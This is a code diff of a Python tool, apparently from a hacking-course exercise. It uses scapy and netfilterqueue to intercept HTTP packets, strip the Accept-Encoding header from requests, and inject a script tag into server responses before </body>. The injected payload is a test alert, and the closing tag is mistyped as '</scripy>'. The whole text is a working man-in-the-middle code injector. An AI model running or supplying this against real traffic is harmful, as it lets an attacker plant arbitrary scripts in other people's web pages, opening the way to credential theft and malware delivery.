@@ -20,9 +20,13 @@ def process_packet(packet):
             modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
             new_packet = set_load(scapy_packet, modified_load)
             packet.set_payload(str(new_packet))
+            print(new_packet.show())
+
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            print(scapy_packet.show())
+            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test');</scripy></body>")
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(str(new_packet))
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
